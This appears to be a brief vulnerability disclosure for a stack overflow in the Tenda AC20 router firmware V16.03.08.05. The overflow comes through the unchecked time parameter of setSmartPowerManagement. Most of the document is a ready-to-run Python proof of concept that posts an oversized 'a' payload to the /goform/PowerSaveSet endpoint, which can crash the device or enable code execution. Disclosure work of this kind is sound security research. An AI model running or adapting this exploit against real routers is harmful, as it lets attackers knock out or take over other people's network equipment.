Tenda AC20 V16.03.08.05 has a stack overflow vulnerability that arises from the time parameter in the setSmartPowerManagement function not checking the length of the input data. An attacker could exploit this vulnerability to execute arbitrary code or cause a denial-of-service attack.

<img width="416" height="335" alt="image" src="https://github.com/user-attachments/assets/730f1d21-3405-490b-964b-b56ffc5876e2" />



POC：
```
from pwn import *
import requests

payload = b'a'*0x1000

url = "http://192.168.100.254/goform/PowerSaveSet"

cookie = {"Cookie":"password=12345"}
data = {"time": payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```
